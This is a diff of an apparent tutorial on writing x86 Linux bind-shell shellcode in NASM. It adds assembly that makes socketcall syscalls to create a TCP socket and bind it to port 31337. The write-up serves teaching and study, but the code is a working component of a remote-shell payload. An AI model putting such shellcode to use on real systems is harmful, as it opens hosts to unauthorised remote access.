@@ -208,7 +208,7 @@ xor ebx, ebx
 xor ecx, ecx
 cdq               ;clears edx
 ```
-Let's create the socket now. Now the way in which ```socketcall()``` works is, the EBX register takes the call number, and ECX takes a pointer to the arguments of that call.
+Let's create the socket now. The way in which ```socketcall()``` works is, the ebx register takes the call number, and ECX takes a pointer to the arguments of that call.
 ```nasm
 ; create socket s=socket(2,1,0)
 mov al, 0x66
@@ -224,3 +224,20 @@ Keep in mind that as the stack grows downwards, we push the arguments in reverse
 - 2: ```AF_INET```
 - 1: ```SOCK_STREAM```
 - 0: ```IPPROTO_IP```
+A pointer to these arguments will then be stored in ecx, and the syscall will then be executed using ```int 0x80```. This will return the socket descriptor in eax, and we store a pointer to that in esi for later use.
+
+Now we will create the address structure and call the ```bind()``` function.
+```nasm
+; create addr struc and bind bind(s, 2,port,0, 16)
+mov al, 0x66
+inc ebx          ;ebx=2
+push edx         ;0
+push word 0x697a ;31337
+push word bx     ;2
+mov ecx, esp     ;pointer to args
+push 0x10        ;16
+push ecx         ;addr struc
+push esi         ;stockfd
+mov ecx, esp     ;pointer to args
+int 0x80         ;syscall
+```
